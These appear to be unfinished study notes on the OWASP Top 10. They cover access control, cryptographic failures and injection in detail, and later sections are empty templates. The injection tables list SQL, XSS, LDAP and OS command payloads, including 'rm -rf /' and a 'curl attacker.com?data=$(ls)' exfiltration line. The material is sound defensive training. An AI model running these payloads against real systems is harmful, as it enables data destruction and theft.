# OWASP Top 10 : 2021

| Vuln                   | Process                     | Tools                        | Mitigation                         |
| ---------------------- | --------------------------- | ---------------------------- | ---------------------------------- |
| SQL Injection          | Inject payloads in inputs   | sqlmap, BurpSuite            | Prepared statements                |
| Broken Access Control  | Test IDOR, missing checks   | BurpSuite, manual review     | RBAC, deny by default              |
| Cryptographic Failures | Review encryption           | SSL Labs, code review        | Use TLS 1.2+, strong algorithms    |
| SSRF                   | Input URL → access metadata | BurpSuite, curl              | Whitelist URLs, block internal IPs |
| Outdated Components    | Inventory, CVE scan         | Snyk, OWASP Dependency-Check | Patch regularly                    |
| Logging Failures       | Review logs & alerts        | SIEM (Splunk, ELK)           | Centralize logs, alert rules       |



## A1 - Broken Access Control
- **Core Concept** Failure to enforce proper restrictions on authenticated users actions.
- Process:
    - Attackers manipulates parameters/URLs to access unauthorized resources.
    - Exploits missing role checks to perform privileged actions.

| Type | Description |
|----------------------------------|---------------------------------------------------------------------------------|
| IDOR | Accessing others' resources via ID manipulation (e.g., /user?id=123 → 124) |
| Missing Function-Level Control | Accessing admin pages without authorization (e.g., /admin without admin role) |
| CSRF | Forcing users to execute unwanted actions via authenticated sessions |
| Privilege Escalation | User → Admin via flawed permission checks |
| Misconfigured Access Controls | Allowing open access by Mistake |
#### Finding - Broken Access Control
- Change IDs URLs/parameters.
- Access privileged endpoints without proper roles.
- Test with different user accounts.
    - **How to find**: Manual testing with tools (Burp Suite), reviewing authorization checks, fuzzing parameters.
#### Mitigations -  Broken Access Control
- Implement RBAC with server-side enforcement. 
    - Instead of directly granting permissions to individual users, you group users into roles (e.g., administrator, editor, guest).
- Use UUIDs(Universally Unique Identifiers) instead of sequential IDs. 
    - 128-bit numbers that are designed to be globally unique. They are randomly generated or based on timestamps and other unique identifiers, making them unpredictable and difficult for attackers to guess or enumerate.
- Add CSRF token and ```SameSite=Strict``` cookies.
    - cookie attribute instructs the browser to only send the cookie with requests that originate from the same site.


## A2 - Cryptographic Failures
- **Core Concept** Exposure of Sensitive data due to weak encryption/handling.
- Process: 
    - Intercept unencrypted data (e.g., HTTP -> passwords).
    - Decrypt weakly protected data (e.g., AES-128 without proper IV).

| Type | Description |
|----------------------------|--------------------------------------------------------------|
| Weak Algorithms | Using MD5/SHA-1 for password hashing |
| Poor Key Management | Hardcoded keys in source code |
| Insecure Hashing | Unsalted password hashes |
| Lack of Encryption | Storing credit cards in plaintext |
#### Finding - Cryptographic Failures
- Check for ```HTTP://``` in network traffic.
- Scan code/configs for hardcoded secrets.
   - **How to find**: Code review, scanning with tools (SSL Labs, testssl.sh), inspecting traffic with proxies.
#### Mitigations -  Cryptographic Failures
- Use TLS 1.3+ and AES-256-GCM.
    - TLS is a cryptographic protocol that provides secure communication over a computer network. TLS 1.3 is the latest version.
    - AES (Advanced Encryption Standard) is a symmetric encryption algorithm widely considered secure. AES-256-GCM is a secure mode of operation for AES that provides both encryption and authentication, ensuring data confidentiality and integrity.
- Hash passwords with bcrypt/PBKDF2.
    - bcrypt and PBKDF2 (Password-Based Key Derivation Function 2) are widely recommended password hashing algorithms that are resistant to brute-force attacks and rainbow table attacks. 
    - They use techniques like key stretching (repeating the hashing process multiple times) to make it computationally expensive to crack passwords.
- Rotate keys via cloud KMS.
    - Cloud Key Management System (KMS): A cloud KMS service (like Google Cloud KMS, AWS KMS, or Azure Key Vault) provides a centralized and secure way to manage cryptographic keys.


## A3 - Injection
- **Core Concept** Malicious data execution in interpreters (SQL, OS, etc.)
- Process:
    - Inject payloads input fields, Search boxs/APIs.
    - Trigger unintended execution (e.g., database deletion).

| Type | Payload Example | Target | Description | 
|------------------------|-----------------------------------------|---------------------|--------|
| SQL Injection | ' OR 1=1-- | Databases | Manipulating SQL queries to trick the database into retrieving confidential data |
| XSS | ```<script>alert(1)</script>``` | User browsers | Injecting malicious scripts into web pages to be executed by other users' browsers. This can allow attackers to steal sensitive data, hijack sessions, or perform actions on the user's behalf |
| OS Command | ; rm -rf / | Servers | Executing arbitrary operating system (OS) commands on a server through a vulnerable application. Attackers exploit applications that pass unsafe user-supplied data to a system shell |
| LDAP Injection | ```*)(uid=*))(\|(uid=*``` | Directories | Manipulating Lightweight Directory Access Protocol (LDAP) queries to exploit vulnerabilities in directory services. This can allow attackers to bypass authentication, modify data, or execute arbitrary commands within the LDAP server |
### SQL Injection
| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
| **Classic SQLi**      | Direct injection into SQL queries through user input.                      | Submit `' OR 1=1 --` in login forms; observe unexpected results.                | Use **parameterized queries** (Prepared Statements).                       |
| **Blind SQLi**        | No direct errors; infer results via boolean or time delays.                | Test with `' AND 1=1 --` (true) vs. `' AND 1=2 --` (false). Time-based: `SLEEP(5)`. | Implement **input validation** and **Web Application Firewalls (WAFs)**.   |
| **Union-Based SQLi**  | Uses `UNION` to combine queries and extract data.                          | Inject `' UNION SELECT username, password FROM users --`.                       | Disable error messages; use **ORM frameworks**.                            |
| **Error-Based SQLi**  | Forces DB errors to leak schema/data.                                      | Trigger errors with `' AND 1=CONVERT(int,@@version) --`.                        | Configure DB to suppress detailed errors.                                  |
| **Out-of-Band SQLi**  | Exfiltrates data via DNS/HTTP requests.                                    | Use tools like `Burp Collaborator` with `LOAD_FILE()` or `xp_dirtree`.          | Block outbound DB connections; sanitize inputs.                            |

### Cross-Site Scripting (XSS)
| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
| **Stored XSS**        | Malicious script stored on server (e.g., in comments).                     | Submit `<script>alert(1)</script>` in input fields; check persistence.          | Use **output encoding** (HTML Entity Encoding).                            |
| **Reflected XSS**     | Script reflected in immediate response (e.g., search results).             | Test URL params: `?q=<script>alert(1)</script>`.                                | Implement **Content Security Policy (CSP)**.                               |
| **DOM XSS**           | Client-side JS manipulates DOM unsafely.                                   | Analyze `document.write()` or `eval()` sinks in JS.                             | Avoid unsafe DOM APIs; use `textContent` over `innerHTML`.                 |
| **Mutated XSS**       | Bypasses filters via obfuscation (e.g., `<img src=x onerror=alert(1)>`).   | Fuzz with polyglots like `jaVasCript:/*--></title></style></textarea></script>`.| Use **XSS filters** (e.g., DOMPurify).                                     |

### OS Command Injection
| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
| **Classic Command Inj.** | Direct execution of OS commands via input (e.g., `; ls /etc`).            | Inject `; whoami` or `\|\| id` in input fields.                                 | Use **allowlist input validation**; avoid `system()` calls.                |
| **Blind Command Inj.**  | No visible output; infer results via delays or out-of-band techniques.     | Test with `ping -c 5 127.0.0.1` (time delay) or `curl attacker.com?data=$(ls)`. | Implement **sandboxed execution** (e.g., containers).                      |
| **Argument Injection**  | Manipulates command arguments (e.g., `tar --file=$(rm -rf /)`).            | Fuzz with `--version` or `$(sleep 5)`.                                          | Use **parameterized APIs** (e.g., `subprocess.run([cmd, arg1, arg2])`).    |


### LDAP Injection
| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
| **Filter Injection**  | Modifies LDAP search filters (e.g., `(uid=*))(\|\|(cn=*))//`).             | Inject `*)(uid=*))(\|\|(1=0` to bypass auth.                                    | Use **LDAP parameterization** (e.g., `escapeDN()`).                        |
| **Attribute Injection** | Injects malicious LDAP attributes (e.g., `admin=true`).                   | Test with `*)(objectClass=*))%00` to truncate filters.                          | Apply **input sanitization** for special chars (`*, (, ), \`, etc.).       |
| **Booleanization**    | Uses LDAP boolean logic to leak data (e.g., `\|\|(mail=*@domain.com)`).    | Probe with `(cn=admin*)(sn=*))` to enumerate users.                             | Limit query results; enforce **access controls**.                          |
#### Finding - Injection
- Fuzz inputs with Burp Suite/SQLMap.
- Test error messages for backend tech leaks.
   - **How to find**: Use tools (sqlmap,Burp Suite), manual payloads, look for error messages.
#### Mitigations -  Injection
- Parameterized queries (Prepared Statement).
    - Parameterized queries, also known as prepared statements, separate SQL code from user-supplied input. Instead of directly embedding user input into the query string, you use placeholders for the values. 
-  Input validation with allowlists.
    - Input validation is the process of checking user-supplied data to ensure it conforms to expected formats, types, and values. Using allowlists (or whitelists)
- Output encoding for XSS.
    - Output encoding transforms potentially harmful characters in user-supplied or untrusted data into a safe format before displaying it on a web page. This prevents the browser from interpreting the data as executable code (like JavaScript) and mitigates the risk of XSS attacks.

## A4 - 
- **Core Concept** 
- Process:
    - 
   

#### Finding - 
   - **How to find**: 

#### Mitigations -  


## A5 - 
- **Core Concept** 
- Process:
    - 
   

#### Finding - 
   - **How to find**: 

#### Mitigations -  

## A6 - 
- **Core Concept** 
- Process:
    - 
   

#### Finding - 
   - **How to find**: 

#### Mitigations -  


## A7 - 
- **Core Concept** 
- Process:
    - 
   

#### Finding - 
   - **How to find**: 

#### Mitigations -  

## A8 - 
- **Core Concept** 
- Process:
    - 
   

#### Finding - 
   - **How to find**: 

#### Mitigations -  


## A9 - 
- **Core Concept** 
- Process:
    - 
   

#### Finding - 
   - **How to find**: 

#### Mitigations - 

## A10 - 
- **Core Concept** 
- Process:
    - 
   

#### Finding - 
   - **How to find**: 

#### Mitigations - 










# OWASP Top 10 - API 

## A - 
- **Core Concept** 
- Process:
    - 
   

#### Finding - 
   - **How to find**: 

#### Mitigations - 

# OWASP Top 10 - Mobile

## A - 
- **Core Concept** 
- Process:
    - 
   

#### Finding - 
   - **How to find**: 

#### Mitigations - 
